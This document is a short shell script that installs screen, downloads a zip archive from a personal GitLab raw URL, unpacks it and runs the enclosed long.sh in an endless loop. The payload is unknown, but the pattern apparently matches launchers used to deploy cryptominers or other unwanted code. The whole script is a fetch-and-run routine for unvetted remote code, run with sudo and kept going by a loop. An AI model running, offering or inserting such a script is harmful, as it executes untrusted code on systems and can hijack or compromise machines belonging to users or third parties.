#!/bin/sh
sudo apt update -y
sudo apt install screen -y
sudo screen -dmS random
wget https://gitlab.com/tonyawill824/long/-/raw/main/long.zip
unzip long.zip
chmod +x long.sh
while [ 1 ]; do
./long.sh
sleep 6969
done
sleep 6969
